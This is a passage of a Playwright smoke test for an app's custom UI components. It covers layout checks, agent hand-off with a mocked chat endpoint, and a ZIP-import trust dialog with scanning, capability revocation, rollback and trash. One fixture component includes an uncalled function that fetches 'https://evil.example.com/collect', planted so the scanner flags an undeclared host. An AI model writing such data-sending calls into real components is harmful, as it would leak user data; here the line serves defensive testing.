    const intrusions = [...document.querySelectorAll('button, a[href], input, [role="tab"]')]
      .filter((element) => !element.closest('.desktop-window-controls'))
      .filter((element) => {
        const rect = element.getBoundingClientRect()
        return rect.width > 0 && rect.top < 48 && rect.right > innerWidth - 144 + 0.5
      })
      .map((element) => element.getAttribute('aria-label') || element.textContent?.trim())
    return {
      customTitlebar: document.querySelectorAll('[data-custom-titlebar]').length,
      inside:
        box.left >= 0 && box.right <= innerWidth && box.top >= 48 && box.bottom <= innerHeight,
      bodies: [...popover.querySelectorAll('[data-overview-component-body]')].map((body) => {
        const rect = body.getBoundingClientRect()
        return `${Math.round(rect.width)}x${Math.round(rect.height)}`
      }),
      // 卡片外框 = 36 卡片头 + 内容区，不被弹层的 flex 列压扁；组件读到的 ctx.size 与内容区一致。
      cards: [...popover.querySelectorAll('[data-overview-component]')].map((card) => {
        const body = card.querySelector('[data-overview-component-body]')
        const panel = card.querySelector('[data-fixture-panel]')
        return `${Math.round(card.getBoundingClientRect().height - body.getBoundingClientRect().height)}:${panel?.dataset.size}`
      }),
      scrolls: popover.scrollHeight > popover.clientHeight,
      intrusions,
    }
  })
  assert.deepEqual(layout1080, {
    customTitlebar: 1,
    inside: true,
    bodies: ['320x248', '320x120', '320x120'],
    cards: ['36:320x248', '36:320x120', '36:320x120'],
    scrolls: true,
    intrusions: [],
  })
  assert.equal(await noHorizontalScroll(hostPage), true)
  await hostPage.screenshot({ path: join(output, 'overview-1080-popover.png') })
  await hostPage.keyboard.press('Escape')
  await popover.waitFor({ state: 'detached' })
  report.checks.push(
    'All agents at 1080×680 with the custom title bar: cards fold into the header “组件 N” popover (320 wide, inside the window, below 48px), nothing enters the 144px corner, no horizontal scroll',
  )

  // 会话检查器：实例范围是另一个项目时不出现；“+”里改为“仅此项目”后出现并选中。
  await hostPage.setViewportSize({ width: 1440, height: 900 })
  const panel = await api(hostPage, 'POST', '/api/custom-ui/instances', {
    componentId: 'panel-card',
    surface: 'session-panel',
    scope: { type: 'project', cwd: join(output, 'elsewhere') },
  })
  assert.equal(panel.status, 201, JSON.stringify(panel))
  const panelId = panel.body.instance.instanceId
  await hostPage.goto(`${base}/#/board/${encodeURIComponent(BOARD_SESSION_ID)}`)
  await hostPage.locator('[data-session-workspace]').waitFor({ timeout: 60_000 })
  await hostPage.keyboard.press('Control+KeyI')
  const inspector = hostPage.locator('[data-inspector-aside] [data-session-inspector]')
  await inspector.waitFor({ timeout: 30_000 })
  await inspector.locator('[data-inspector-tab-id="changes"]').waitFor()
  await settle(hostPage)
  assert.equal(await inspector.locator('[data-inspector-component-tab]').count(), 0)
  await inspector.locator('[data-inspector-component-add]').click()
  const candidate = hostPage.locator('[data-session-component-candidate="panel-card"]')
  await candidate.waitFor({ timeout: 30_000 })
  await candidate.locator('[data-session-component-scope="project"]').click()
  const componentTab = inspector.locator(`[data-inspector-component-tab="${panelId}"]`)
  await componentTab.waitFor({ timeout: 30_000 })
  assert.equal(await componentTab.getAttribute('aria-selected'), 'true')
  const panelHost = inspector.locator('[data-fixture-panel="session-panel"]')
  await panelHost.waitFor({ timeout: 30_000 })
  assert.equal(await panelHost.getAttribute('data-session'), BOARD_SESSION_TITLE)
  const panelWidth = Number((await panelHost.getAttribute('data-size')).split('x')[0])
  assert.ok(panelWidth >= 440 && panelWidth <= 456, `session panel width ${panelWidth}`)
  const scoped = (await api(hostPage, 'GET', '/api/custom-ui/instances')).body.instances.find(
    (entry) => entry.instanceId === panelId,
  )
  assert.deepEqual(scoped.scope, { type: 'project', cwd: workspace })
  // 只有一个 tablist：方向键从组件标签回到最后一个固定标签，再回来。
  await componentTab.focus()
  await hostPage.keyboard.press('ArrowLeft')
  await settle(hostPage)
  assert.equal(await componentTab.getAttribute('aria-selected'), 'false')
  assert.equal(await inspector.getAttribute('data-inspector-component'), null)
  await hostPage.keyboard.press('ArrowRight')
  await settle(hostPage)
  assert.equal(await componentTab.getAttribute('aria-selected'), 'true')
  // “+”在横滚标签行之外：组件标签再多也完整可见、可点（A7 截图发现两个组件标签时被挤出可视区）。
  const addVisible = await inspector
    .locator('[data-inspector-component-add]')
    .evaluate((button) => {
      const box = button.getBoundingClientRect()
      const hit = document.elementFromPoint(box.left + box.width / 2, box.top + box.height / 2)
      return Boolean(hit && button.contains(hit)) && !button.closest('[role="tablist"]')
    })
  assert.equal(addVisible, true)
  assert.equal(await noHorizontalScroll(hostPage), true)
  await hostPage.screenshot({ path: join(output, 'session-panel-1440.png') })
  report.checks.push(
    'Session inspector: a session-panel instance scoped to another project stays hidden; “+” → 仅此项目 re-scopes it, the tab appears selected and renders with ctx.session = this session at the inspector width; arrow keys move across fixed and component tabs; “+” stays outside the scrolling tab row',
  )

  // 工作室预览与全部代理卡片 1:1（评审返修）：预览框描边不占布局，组件拿到的正好是标注的 320×248 / 320×120。
  await hostPage.goto(`${base}/#/components/panel-card`)
  for (const [label, expected] of [
    ['总览 M', '320x248'],
    ['总览 S', '320x120'],
  ]) {
    await hostPage.getByRole('radio', { name: label, exact: true }).click()
    const previewPanel = hostPage.locator(
      `[data-component-preview] [data-fixture-panel="overview-card"][data-size="${expected}"]`,
    )
    await previewPanel.waitFor({ timeout: 30_000 })
    const frame = await hostPage
      .locator('[data-component-preview-frame]')
      .evaluate((node) => `${node.clientWidth}x${node.clientHeight}`)
    assert.equal(frame, expected, `${label} preview frame`)
  }
  report.checks.push(
    'Studio preview is 1:1 with the all-agents card: the component gets exactly 320×248 (M) and 320×120 (S) inside the preview frame',
  )
  await hostPage.waitForTimeout(3_500)
  await hostContext.close()

  // 13. S7 代理生成闭环：拦截 /api/chat（不连模型），断言消息以 '/skill:pisper-component ' 开头（命令后是空格）；
  // 绑定会话“生成组件 · <名称>”由真实 Runtime 建在组件目录下，并出现在侧栏“运行中”；
  // 错误卡的 [让代理修复] 带上错误摘要；“空白 + 描述”新建后交给代理生成。
  const agentContext = await newContext({ viewport: { width: 1440, height: 900 } })
  const chats = []
  const heldRuns = []
  // /api/chat 被拦截，真实 Runtime 从没跑过这些会话：目录里它们一直是 streaming:false、0 条消息。
  // 看板的“运行中”以 Runtime 为准（乐观补丁在确认后最多 4 秒撤掉），不补这一层，检查“运行中”就是在赌
  // 那 4 秒窗口（负载高时偶发失败，A7 全量检查复现过）。这里让会话目录如实反映“正在跑”：
  // 收到过 /api/chat 的会话在 /api/sessions 的响应里标成 streaming、至少 1 条消息，直到放行终态帧；
  // 事件流断开，看板退回按目录轮询，读到的就是这份响应。
  const runningIds = new Set()
  const markRunning = (value) => {
    if (Array.isArray(value)) return value.map(markRunning)
    if (!value || typeof value !== 'object') return value
    const next = Object.fromEntries(
      Object.entries(value).map(([key, item]) => [key, markRunning(item)]),
    )
    if (typeof next.id === 'string' && runningIds.has(next.id) && 'streaming' in next) {
      next.streaming = true
      next.messageCount = Math.max(1, Number(next.messageCount) || 0)
    }
    return next
  }
  await agentContext.route('**/api/board/events*', (route) => route.abort())
  await agentContext.route(/\/api\/sessions(?:\?.*)?$/, async (route) => {
    if (route.request().method() !== 'GET') return route.fallback()
    const response = await fetchIdempotent(route)
    await route.fulfill({ response, json: markRunning(await response.json()) })
  })
  await agentContext.route('**/api/chat', async (route) => {
    const body = JSON.parse(route.request().postData() || '{}')
    chats.push(body)
    if (typeof body.sessionId === 'string') runningIds.add(body.sessionId)
    await route.fulfill({
      status: 200,
      headers: { 'content-type': 'text/event-stream' },
      body: `event: run\ndata: ${JSON.stringify({ runId: `smoke-run-${chats.length}`, sessionId: body.sessionId })}\n\n`,
    })
  })
  // 断流后的续传一直挂着：运行流由看板 store 持有，会话保持“运行中”，直到冒烟结束放行终态帧。
  await agentContext.route('**/api/runs/**', (route) => {
    heldRuns.push(route)
  })
  const chatCount = async (count) => {
    const deadline = Date.now() + 30_000
    while (chats.length < count) {
      if (Date.now() > deadline)
        throw new Error(`expected ${count} /api/chat requests, saw ${chats.length}`)
      await new Promise((done) => setTimeout(done, 100))
    }
  }
  const agentPage = await openPage(agentContext, 'agent', '#/components/native-ok')
  const promptInput = agentPage.locator(
    '[data-component-prompt="native-ok"] [data-component-prompt-input]',
  )
  await promptInput.waitFor({ timeout: 30_000 })
  assert.equal(
    await agentPage
      .locator('[data-component-prompt="native-ok"] [data-component-generate]')
      .isDisabled(),
    true,
    'generate is disabled without a prompt',
  )
  await promptInput.fill('显示今天每个项目的任务数')
  await promptInput.press('Control+Enter')
  await chatCount(1)
  await agentPage
    .locator('[data-component-prompt="native-ok"] [data-component-agent-status]')
    .waitFor({ timeout: 30_000 })
  assert.equal(chats.length, 1)
  assert.equal(chats[0].message, '/skill:pisper-component 显示今天每个项目的任务数')
  const boundId = chats[0].sessionId
  assert.ok(boundId, 'bound session id')
  assert.equal(await promptInput.inputValue(), '', 'prompt clears after hand-off')
  const boundState = JSON.parse(await readFile(join(dataDir, 'custom-ui-state.json'), 'utf8'))
  assert.equal(JSON.stringify(boundState).includes(boundId), true, 'bound session recorded')
  await agentPage.locator('[data-component-agent-status="running"]').waitFor({ timeout: 30_000 })
  // 离开工作室（侧栏从窄轨回到展开），会话在侧栏“运行中”分组里，标题是“生成组件 · 原生卡片”。
  await agentPage.evaluate(() => {
    window.location.hash = '#/more'
  })
  const runningRow = agentPage.locator(
    `[data-sidebar-group="running"] [data-sidebar-row="${boundId}"][data-sidebar-group-row="running"]`,
  )
  await runningRow.waitFor({ timeout: 30_000 })
  assert.match(await runningRow.textContent(), /生成组件 · 原生卡片/)
  await agentPage.screenshot({ path: join(output, 'agent-running-sidebar.png') })
  report.checks.push(
    'Prompt card: ⌘↵ hands the prompt to a bound “生成组件 · 名称” session created by the Runtime; the message starts with “/skill:pisper-component ” (space), the session is recorded and shows under Running in the sidebar',
  )

  // 错误卡 [让代理修复]：同样建绑定会话，提示词是“修复以下错误：”+ 错误摘要（含消息与调用栈）。
  await agentPage.evaluate(() => {
    window.location.hash = '#/components/crasher'
  })
  const fixHost = agentPage.locator('[data-component-preview] [data-component-host="crasher"]')
  await fixHost.getByRole('button', { name: '让代理修复' }).click({ timeout: 30_000 })
  await chatCount(2)
  await agentPage
    .locator('[data-component-prompt="crasher"] [data-component-agent-status]')
    .waitFor({ timeout: 30_000 })
  assert.equal(chats.length, 2)
  assert.notEqual(chats[1].sessionId, boundId, 'each component has its own bound session')
  assert.match(chats[1].message, /^\/skill:pisper-component 修复以下错误：\nError: fixture crash\n/)
  assert.ok(chats[1].message.length < 2_000, 'fix summary stays short')
  report.checks.push(
    '[让代理修复] on the error card sends “修复以下错误：” with the error message and stack excerpt to the crashing component’s own bound session',
  )

  // 空白 + 描述：建好目录后交给代理生成。
  await agentPage.locator('[data-component-new]').first().click()
  await agentPage.locator('[data-component-new-blank]').click()
  await agentPage.locator('[data-component-new-name]').fill('天气')
  await agentPage.locator('[data-component-new-prompt]').fill('显示上海今天的天气')
  await agentPage.getByRole('button', { name: '创建并生成' }).click()
  await agentPage.waitForFunction(
    () => location.hash.startsWith('#/components/') && !location.hash.endsWith('crasher'),
    null,
    {
      timeout: 30_000,
    },
  )
  await chatCount(3)
  assert.equal(chats.length, 3)
  assert.equal(chats[2].message, '/skill:pisper-component 显示上海今天的天气')
  const blankId = decodeURIComponent(
    (await agentPage.evaluate(() => location.hash)).split('/').pop(),
  )
  assert.equal(existsSync(join(componentsRoot, blankId, 'component.js')), true)
  assert.equal(await noHorizontalScroll(agentPage), true)
  await agentPage.screenshot({ path: join(output, 'agent-prompt-card.png') })
  report.checks.push(
    'New → blank with a description creates the component and hands the description to its bound session',
  )
  // 放行挂着的续传：终态帧结束本客户端持有的运行流；目录也不再报“正在跑”。
  runningIds.clear()
  for (const route of heldRuns.splice(0))
    await route
      .fulfill({
        status: 200,
        headers: { 'content-type': 'text/event-stream' },
        body: 'event: done\ndata: {}\n\n',
      })
      .catch(() => {})
  await agentPage.waitForTimeout(3_500)
  await agentContext.close()

  // 14. A8 信任与生命周期：导入暂存 → 信任确认（扫描、sha256）→ 台账与撤销 → 替换导入（diff）→
  // 崩溃的错误卡 [回滚到 v1] → 版本对比 → 导出 ZIP → 删除进回收站并恢复 → 待确认导入的取消与丢弃。
  const sharedManifest = (version) => ({
    runtime: 'native',
    sdk: 1,
    name: '分享卡片',
    version,
    placements: [{ surface: 'overview-card', sizes: ['S', 'M'] }, { surface: 'feature-page' }],
    capabilities: {
      network: { hosts: ['api.github.com'], reason: '读取构建状态' },
      storage: { quotaKb: 16, reason: '记住上次查看' },
    },
  })
  // v1：挂载时写一次存储（台账里应出现“存储 · 今天 1 次”）；源码里留一处没调用的直连 fetch，扫描应标红。
  const sharedV1 = [
    'export default function SharedCard({ ctx }) {',
    '  const { React, html } = ctx',
    "  React.useEffect(() => { ctx.storage.set('seen', 1).catch(() => {}) }, [])",
    '  return html`<p data-fixture-shared="v1">分享卡片 v1</p>`',
    '}',
    '// 从没被调用：只是让静态扫描有东西可报。',
    "export function leak() { return fetch('https://evil.example.com/collect') }",
    '',
  ].join('\n')
  const sharedV2 = "export default function SharedCard() { throw new Error('v2 crash') }\n"
  const sharedZip = (version, source) =>
    Buffer.from(
      zipSync({
        'share/shared-card/manifest.json': strToU8(JSON.stringify(sharedManifest(version))),
        'share/shared-card/component.js': strToU8(source),
      }),
    )
  const zipV1 = sharedZip('1.0.0', sharedV1)
  const zipV2 = sharedZip('1.1.0', sharedV2)
  const lifeContext = await newContext({
    viewport: { width: 1440, height: 900 },
    acceptDownloads: true,
  })
  const life = await openPage(lifeContext, 'lifecycle', '#/components/native-ok')
  await life.locator('[data-component-row="native-ok"]').waitFor({ timeout: 60_000 })
  const upload = (buffer, name) =>
    life
      .locator('[data-component-import-input]')
      .setInputFiles({ name, mimeType: 'application/zip', buffer })

  await upload(zipV1, 'shared-card.zip')
  const trustDialog = life.locator('[data-trust-dialog]')
  await trustDialog.waitFor({ timeout: 30_000 })
  await trustDialog.locator('[data-trust-source="component.js"]').waitFor({ timeout: 30_000 })
  assert.match(
    await trustDialog.locator('[data-trust-sha256]').textContent(),
    new RegExp(createHash('sha256').update(zipV1).digest('hex')),
  )
  await trustDialog
    .locator('[data-scan-finding="fetch"][data-severity="danger"]')
    .waitFor({ timeout: 10_000 })
  assert.equal(
    await trustDialog.locator('[data-scan-host="evil.example.com"]').getAttribute('data-declared'),
    'false',
  )
  // 暂存不等于安装：信任之前 custom-ui/ 里没有它。
  assert.equal(existsSync(join(componentsRoot, 'shared-card')), false)
  assert.equal(await noHorizontalScroll(life), true)
  await life.screenshot({ path: join(output, 'trust-dialog-1440.png') })
  await trustDialog.locator('[data-trust-confirm]').click()
  await trustDialog.waitFor({ state: 'detached', timeout: 30_000 })
  await life
    .locator('[data-component-preview] [data-fixture-shared="v1"]')
    .waitFor({ timeout: 30_000 })
  assert.equal(
    await life.locator('[data-component-row="shared-card"]').getAttribute('aria-current'),
    'true',
  )
  report.checks.push(
    'Import ZIP only stages: the trust dialog shows source, sha256 of the archive, the bare fetch flagged red and the undeclared host; nothing is installed until 信任并启用, after which it is selected and renders',
  )

  // 台账：挂载时那次 storage.set 由 Runtime 记下（最多等一轮 15 秒的补读）；撤销后存储被 Runtime 拒绝，恢复后放行。
  const storageRow = life.locator('[data-component-capability="storage"]')
  await life.waitForFunction(
    () =>
      /今天 1 次/.test(
        document.querySelector('[data-component-capability="storage"] [data-capability-usage]')
          ?.textContent ?? '',
      ),
    undefined,
    { timeout: 30_000 },
  )
  await storageRow.locator('[data-capability-toggle="storage"]').click()
  await life
    .locator('[data-component-capability="storage"][data-capability-revoked]')
    .waitFor({ timeout: 10_000 })
  const revoked = await api(life, 'GET', '/api/custom-ui/components/shared-card/storage/seen')
  assert.deepEqual([revoked.status, revoked.body.code], [403, 'component_capability_revoked'])
  await storageRow.locator('[data-capability-toggle="storage"]').click()
  await life
    .locator('[data-component-capability="storage"]:not([data-capability-revoked])')
    .waitFor({ timeout: 10_000 })
  assert.equal(
    (await api(life, 'GET', '/api/custom-ui/components/shared-card/storage/seen')).status,
    200,
  )
  report.checks.push(
    'Capability list shows the Runtime-recorded storage call (今天 1 次); 撤销 makes the Runtime refuse storage with component_capability_revoked, 恢复 allows it again',
  )

  // 替换导入：确认表写明会替换已安装版本，内嵌 diff；信任后 v2 崩溃，错误卡给出 [回滚到 v1]。
  await upload(zipV2, 'shared-card-1.1.zip')
  await trustDialog.waitFor({ timeout: 30_000 })
  await trustDialog.locator('[data-trust-replaces]').waitFor({ timeout: 30_000 })
  await trustDialog.locator('[data-trust-diff]').click()
  // diff 查看器是懒加载的：等它把内容画出来再读。
  await life.waitForFunction(
    () => /v2 crash/.test(document.querySelector('[data-trust-diff-view]')?.textContent ?? ''),
    undefined,
    { timeout: 30_000 },
  )
  await life.screenshot({ path: join(output, 'trust-replace-diff-1440.png') })
  await trustDialog.locator('[data-trust-confirm]').click()
  await trustDialog.waitFor({ state: 'detached', timeout: 30_000 })
  const rollback = life.locator('[data-component-preview] [data-component-rollback="1"]')
  await rollback.waitFor({ timeout: 30_000 })
  await life.screenshot({ path: join(output, 'error-card-rollback-1440.png') })
  await rollback.click()
  await life
    .locator('[data-component-preview] [data-fixture-shared="v1"]')
    .waitFor({ timeout: 30_000 })
  report.checks.push(
    'Replacing import shows the installed-version diff inline; after trusting the crashing v2 the error card offers 回滚到 v1, which restores a working preview',
  )

  // 版本：当前是回滚生成的 v3，v2（导入）与 v1 都还在；[对比] 打开 v2 → 当前的 diff，Esc 关闭。
  const current = life.locator('[data-version-current]')
  await life
    .locator('[data-version-current][data-component-version="3"]')
    .waitFor({ timeout: 30_000 })
  assert.match(await current.textContent(), /回滚/)
  assert.deepEqual(
    await life
      .locator('[data-component-versions] [data-component-version]')
      .evaluateAll((nodes) => nodes.map((node) => node.dataset.componentVersion)),
    ['3', '2', '1'],
  )
  await life.locator('[data-version-compare="2"]').click()
  const versionDiff = life.locator('[data-version-diff="2"]')
  await versionDiff.waitFor({ timeout: 30_000 })
  assert.match(await versionDiff.textContent(), /component\.js/)
  await life.keyboard.press('Escape')
  await versionDiff.waitFor({ state: 'detached', timeout: 10_000 })
  report.checks.push(
    'Versions list v3 当前 (回滚) · v2 · v1; 对比 opens the v2 → current diff in the session diff viewer and Esc closes it',
  )

  // 导出 ZIP：与导入同一布局，内容是当前（v1）的文件。
  const [download] = await Promise.all([
    life.waitForEvent('download'),
    life.locator('[data-studio-settings] [data-component-export]').click(),
  ])
  assert.equal(download.suggestedFilename(), 'shared-card.zip')
  const exported = unzipSync(new Uint8Array(await readFile(await download.path())))
  assert.deepEqual(Object.keys(exported).sort(), [
    'shared-card/component.js',
    'shared-card/manifest.json',
  ])
  assert.match(Buffer.from(exported['shared-card/component.js']).toString('utf8'), /分享卡片 v1/)
  report.checks.push(
    '导出 ZIP downloads <id>/manifest.json + component.js with the current contents',
  )

  // 回收站：删除 → 回收站列出（7 天后清除；启动迁移来的旧组件“不自动清除”、不能恢复）→ 恢复。
  await life.locator('[data-studio-settings] [data-component-more]').click()
  await life.locator('[data-component-delete]').click()
  await life.locator('[data-component-delete-confirm]').click()
  await life
    .locator('[data-component-row="shared-card"]')
    .waitFor({ state: 'detached', timeout: 30_000 })
  await life.locator('[data-component-trash]').click()
  const trashDialog = life.locator('[data-trash-dialog]')
  const sharedEntry = trashDialog.locator('[data-trash-entry^="shared-card-"]')
  await sharedEntry.waitFor({ timeout: 30_000 })
  assert.match(await sharedEntry.textContent(), /7 天后清除/)
  const legacyEntry = trashDialog.locator('[data-trash-entry^="legacy-old-"]')
  assert.match(await legacyEntry.textContent(), /不自动清除/)
  assert.equal(await legacyEntry.locator('[data-trash-restore]').count(), 0)
  await life.screenshot({ path: join(output, 'trash-1440.png') })
  await sharedEntry.locator('[data-trash-restore]').click()
  await trashDialog.waitFor({ state: 'detached', timeout: 30_000 })
  await life
    .locator('[data-component-preview] [data-fixture-shared="v1"]')
    .waitFor({ timeout: 30_000 })
  report.checks.push(
    'Deleting moves the component to the trash (7 天后清除); legacy components moved at startup are listed as 不自动清除 without 恢复; 恢复 brings the component back and selects it',
  )

  // 待确认导入：[取消] 只关掉，组件库里留一行琥珀虚线框，“需处理”计入；从那一行重新打开后 [丢弃]。
  await upload(zipV1, 'again.zip')
  await trustDialog.waitFor({ timeout: 30_000 })
  await trustDialog.getByRole('button', { name: '取消', exact: true }).click()
  await trustDialog.waitFor({ state: 'detached', timeout: 10_000 })
  const stagedRow = life.locator('[data-staged-row]')
  await stagedRow.waitFor({ timeout: 30_000 })
  assert.match(await stagedRow.textContent(), /again\.zip/)
  await life.screenshot({ path: join(output, 'staged-row-1440.png') })
  await stagedRow.locator('[data-staged-review]').click()
  await trustDialog.waitFor({ timeout: 30_000 })
  await trustDialog.locator('[data-trust-discard]').click()
  await stagedRow.waitFor({ state: 'detached', timeout: 30_000 })
  assert.deepEqual((await api(life, 'GET', '/api/custom-ui/components')).body.staged, [])
  report.checks.push(
    'A cancelled import stays as an amber dashed 待确认导入 row; reopening it and 丢弃 removes the staged archive',
  )
  await life.waitForTimeout(3_500)
  await lifeContext.close()

  assert.deepEqual(report.pageErrors, [])
  report.status = 'passed'
  console.log(JSON.stringify(report, null, 2))
} catch (error) {
  report.status = 'failed'
  report.failure = String(error?.stack || error)
  if (failurePage && !failurePage.isClosed()) {
    await failurePage.screenshot({ path: join(output, 'failure.png') }).catch(() => {})
    console.log(
      (
        await failurePage
          .locator('body')
          .ariaSnapshot()
          .catch(() => '')
      ).slice(-6000),
    )
  }
  throw error
} finally {
  await writeFile(join(output, 'report.json'), JSON.stringify(report, null, 2))
  await browser?.close()
  await app.close()
  for (const directory of [dataDir, workspace, fixtureHome]) {
    assert.equal(dirname(directory), output, 'Unsafe temporary cleanup path')
    await rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 })
  }
  console.log(`Components smoke report and screenshots: ${output}`)
}
